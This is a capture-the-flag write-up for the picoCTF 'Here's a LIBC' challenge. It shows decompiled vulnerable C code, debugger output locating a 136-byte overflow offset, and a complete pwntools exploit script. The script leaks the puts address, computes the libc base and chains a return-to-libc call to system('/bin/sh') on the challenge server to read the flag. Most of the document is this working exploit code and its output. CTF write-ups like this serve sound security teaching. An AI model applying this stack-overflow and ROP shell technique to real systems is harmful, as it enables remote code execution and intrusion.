# Here's a LIBC
## Description
I am once again asking for you to pwn this binary vuln libc.so.6 Makefile nc mercury.picoctf.net 62289

> 90 points

## Hint
PWNTools has a lot of useful features for getting offsets.

``` makefile
all:
        gcc -Xlinker -rpath=./ -m64 -fno-stack-protector -no-pie -o vuln vuln.c

clean:
        rm vuln
```

```console
┌──(kali㉿kali)-[/tmp/herelibc]
└─$ checksec vuln 
[*] '/tmp/herelibc/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./'
```

```c
void main(undefined4 param_1,undefined8 param_2)

{
  char cVar1;
  char acStack168 [24];
  undefined8 uStack144;
  undefined8 local_88;
  undefined4 local_7c;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined2 local_60;
  undefined local_5e;
  char *local_50;
  undefined8 local_48;
  ulong local_40;
  __gid_t local_34;
  ulong local_30;
  
  uStack144 = 0x40079c;
  local_88 = param_2;
  local_7c = param_1;
  setbuf(stdout,(char *)0x0);
  uStack144 = 0x4007a1;
  local_34 = getegid();
  uStack144 = 0x4007bb;
  setresgid(local_34,local_34,local_34);
  local_40 = 0x1b;
  local_78 = 0x20656d6f636c6557;
  local_70 = 0x636520796d206f74;
  local_68 = 0x6576726573206f68;
  local_60 = 0x2172;
  local_5e = 0;
  local_48 = 0x1a;
  local_50 = acStack168;
  for (local_30 = 0; local_30 < local_40; local_30 = local_30 + 1) {
    cVar1 = convert_case((int)*(char *)((long)&local_78 + local_30),local_30);
    local_50[local_30] = cVar1;
  }
  puts(local_50);
  do {
    do_stuff();
  } while( true );
}
```

```c
void do_stuff(void)

{
  char cVar1;
  undefined local_89;
  char local_88 [112];
  undefined8 local_18;
  ulong local_10;
  
  local_18 = 0;
  __isoc99_scanf("%[^\n]",local_88);
  __isoc99_scanf(&DAT_0040093a,&local_89);
  for (local_10 = 0; local_10 < 100; local_10 = local_10 + 1) {
    cVar1 = convert_case((int)local_88[local_10],local_10);
    local_88[local_10] = cVar1;
  }
  puts(local_88);
  return;
}
```

find the offset base buffer overflow

```python
def find_the_offset (NUM_CYCLIC_BYTES = 256):
        payload = cyclic(NUM_CYCLIC_BYTES)
        # Run the process once so that it crashes.
        proc = process([exe.path])
        # Send the payload.
        proc.sendlineafter(b'WeLcOmE To mY EcHo sErVeR!', payload)
        proc.wait()
        # Get the core dump.
        core = proc.corefile
        assert pack(core.fault_addr) in payload, "Faulting address not in the \
                                                cyclic pattern."
        # find offset
        offset = cyclic_find(pack(core.fault_addr), n=4)
        return offset # offset: 136
      
```
or 
```console 
gef➤  pattern offset $rsp
[+] Searching for '$rsp'
[+] Found at offset 136 (little-endian search) likely
[+] Found at offset 129 (big-endian search)
```


```console 
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x7a              
$rbx   : 0x0               
$rcx   : 0x007ffff7af4264  →  0x5477fffff0003d48 ("H="?)
$rdx   : 0x007ffff7dd18c0  →  0x0000000000000000
$rsp   : 0x007fffffffde38  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x007ffff7dd07e3  →  0xdd18c0000000000a ("\n"?)
$rdi   : 0x1               
$rip   : 0x00000000400770  →  <do_stuff+152> ret 
$r8    : 0x79              
$r9    : 0x0               
$r10   : 0x0               
$r11   : 0x246             
$r12   : 0x1b              
$r13   : 0x0               
$r14   : 0x1b              
$r15   : 0x0               
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffde38│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"      ← $rsp
0x007fffffffde40│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x007fffffffde48│+0x0010: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x007fffffffde50│+0x0018: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x007fffffffde58│+0x0020: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x007fffffffde60│+0x0028: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x007fffffffde68│+0x0030: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0x007fffffffde70│+0x0038: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400769 <do_stuff+145>   call   0x400540 <puts@plt>
     0x40076e <do_stuff+150>   nop    
     0x40076f <do_stuff+151>   leave  
 →   0x400770 <do_stuff+152>   ret    
[!] Cannot disassemble from $PC
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x400770 in do_stuff (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400770 → do_stuff()
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  

```


```console 
┌──(kali㉿kali)-[~/workspace/picoctf/herelibc]
└─$ python3 ~/.tools/ROPgadget/ROPgadget.py  --binary vuln_patched | grep 'pop rdi ; ret'
0x0000000000400913 : pop rdi ; ret
```

```python3 
#!/usr/bin/env python3

from pwn import *

libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

exe = context.binary = ELF("./vuln_patched")
context.log_level = 'info'

def find_the_offset (NUM_CYCLIC_BYTES = 256):
    payload = cyclic(NUM_CYCLIC_BYTES)
    # Run the process once so that it crashes.
    proc = process([exe.path])
    # Send the payload.
    proc.sendlineafter(b'WeLcOmE To mY EcHo sErVeR!', payload)
    proc.wait()
    # Get the core dump.
    core = proc.corefile
    assert pack(core.fault_addr) in payload, "Faulting address not in the \
                                                cyclic pattern."
    # find offset
    offset = cyclic_find(pack(core.fault_addr), n=4)
    return offset # offset: 136

def rop_find_puts_add(offset, puts_got):
    rop = ROP(exe)
    # Call `puts` with the address of puts as the argument to the function.
    rop.call('puts', [puts_got])

    # Call do_stuff to go through the loop again without exiting the executable.
    rop.call('do_stuff')

    # Pad our way to the offset where we need to overwrite the return address.
    ropchain = fit({
        offset: rop
    })

    log.debug(rop.dump())

    return ropchain


def conn():
    if args.get('REMOTE'):
        r = remote("mercury.picoctf.net", 62289)

    else:
        r = process([exe.path])

    return r


def rop_call_system(offset, puts_got):
    '''Create a ROP chain that will call `system(/bin/sh)`. This will allow us
    to cat the flag on the remote filesytem.
    '''
    rop = ROP(exe)

    # Find some text to call `/bin/sh`.
    gen = libc.search(b'/bin/sh')

    # Get the first instance that it occurs.
    try:
        bin_sh = gen.__next__()
    except StopIteration:
        log.error('Could not find "/bin/sh" in libc.')
        sys.exit(1)

    # Call puts to align the stack.
    rop.call('puts', [puts_got])
    # Call system to spawn a shell.
    rop.call(libc.symbols['system'], [bin_sh])
    log.info(rop.dump())

    log.debug("Second ROP Chain:\n{}".format(rop.dump()))

    ropchain = fit({
        offset: rop
    })

    return ropchain

def main():
    '''Return the flag.
    '''
    r = conn()

    offset = find_the_offset() # 136
    print(f"The offset to the faulting address is: {offset}.")

    puts_plt = exe.plt['puts'] # PIE is not enabled, so this will not change.
    puts_got = exe.got['puts'] # PIE is not enabled, so this will not change.
    log.info(f"The address of `puts` in the PLT is: {hex(puts_plt)}.")
    log.info(f"The address of `puts` in the GOT is: {hex(puts_got)}.")

    # Get out first ropchain to find the address of `puts` in the GOT after it
    # has been resolved by the dynamic linker.
    ropchain = rop_find_puts_add(offset, puts_got)

    # Send our first ropchain.
    r.sendlineafter(b'WeLcOmE To mY EcHo sErVeR!', ropchain)
    r.recvline()
    r.recvline()

    # This represents where the address of `puts` is in libc after it has been
    # loaded into memory at runtime. Now we can calculate the offset to other things
    # in libc.
    puts_addr = int.from_bytes(r.recvline(keepends = False), byteorder =
                                                            "little")
    log.info(f"puts() runtime address: {hex(puts_addr)}")

    # We can now calculate the base address of libc.
    # We can have pwntools do the easy work for us by setting the base address
    # like so.
    libc.address = puts_addr - libc.symbols['puts']
    log.info(f"The base address of libc is: {hex(libc.address)}")

    # Call our second ropchain to actually pop a shell.
    ropchain = rop_call_system(offset, puts_got)
    r.sendline(ropchain)
    r.recvline()
    r.recvline()

    r.sendline(b'cat flag.txt')
    flag = r.recv()
    log.info(f'Flag: {flag}')
    return flag

if __name__ == '__main__':
    main()
```
```note
picoCTF{1_<3_sm4sh_st4cking_  8652b55904cb7c}
```



